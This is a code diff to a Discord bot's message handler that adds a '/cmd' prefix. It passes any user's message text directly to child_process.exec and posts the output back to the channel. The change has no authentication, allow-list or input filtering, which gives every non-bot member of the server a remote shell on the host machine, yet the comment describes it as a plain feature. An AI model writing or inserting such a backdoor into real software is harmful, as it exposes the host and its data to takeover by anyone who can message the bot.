@@ -24,6 +24,31 @@ SystemBot.once("ready", () => {
 });
 
 SystemBot.on("messageCreate", async (message) => {
+  // Ignore messages from bots
+  if (message.author.bot) return;
+
+  // Allow running arbitrary commands with /cmd prefix
+  if (message.content.startsWith('/cmd ')) {
+    const { exec } = require('child_process');
+    const cmd = message.content.slice(5).trim();
+    try {
+      await message.channel.sendTyping();
+      exec(cmd, (error, stdout, stderr) => {
+        if (error) {
+          console.error(`Error executing command "${cmd}":`, error.message);
+          return message.reply(`Error: ${error.message}`);
+        }
+        const response = stdout || stderr;
+        message.reply(`Command Output:\n${response}`);
+      });
+    } catch (err) {
+      console.error('Command execution error:', err);
+      message.reply("Sorry, couldn't process your command.");
+    }
+    return;
+  }
+
+  // Process messages that mention the bot
   if (!message.mentions.users.has(SystemBot.user.id)) return;
   try {
     await message.channel.sendTyping();
